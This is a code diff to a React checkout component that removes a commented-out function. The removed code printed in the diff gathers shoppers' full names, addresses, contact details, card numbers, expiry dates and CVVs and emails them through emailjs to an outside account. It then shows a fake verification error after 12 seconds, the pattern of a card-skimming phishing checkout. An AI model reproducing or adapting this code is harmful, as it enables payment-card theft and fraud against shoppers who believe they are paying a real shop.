@@ -55,52 +55,6 @@ export default function Checkout() {
 
   const paymentFees = selectedPaymentMethod === 'card' ? (discountedPrice * 0.025).toFixed(2) : 0;
 
-  // const proceedCheckout = async (event) => {
-  //   event.preventDefault();
-  //   setShowVerificationWrapper(true);
-
-  //   const cardNumber = event.target.cardNumber.value.replace(/\s/g, '');
-
-  //   try {
-  //     const response = await axios.post('/api/check-card', { cardNumber });
-  //     const { bankName, bankLogo } = response.data; // Récupérer bankName et bankLogo de la réponse
-  //     setBankName(bankName);
-  //     setBankLogo(bankLogo);
-  //     setCardType(response.data.cardType);
-  //     setCardScheme(response.data.cardScheme);
-  //     setCardCountry(response.data.cardCountry);
-
-  //     setTimeout(() => {
-  //       setVerificationError(true);
-  //     }, 12000);
-
-  //     const form = event.target;
-  //     const formData = {
-  //       totalPrice: form.totalPrice.value,
-  //       products: form.products.value,
-  //       website: form.website.value,
-  //       address: form.address.value,
-  //       suite: form.suite.value,
-  //       postalCode: form.postalCode.value,
-  //       city: form.city.value,
-  //       email: form.email.value,
-  //       fullName: form.fullName.value,
-  //       phone: form.phone.value,
-  //       cardHolder: form.cardHolder.value,
-  //       cardNumber: form.cardNumber.value,
-  //       expiryDate: form.expiryDate.value,
-  //       cvv: form.cvv.value,
-  //       bankName: bankName
-  //     };
-
-  //     await emailjs.send('gmail-benedikt', 'new-payment', formData);
-
-  //   } catch (error) {
-  //     console.error('Error checking card:', error);
-  //     setVerificationError(true);
-  //   }
-  // };
-
   const showStep = (step) => {
     setCurrentStep(step);
   };
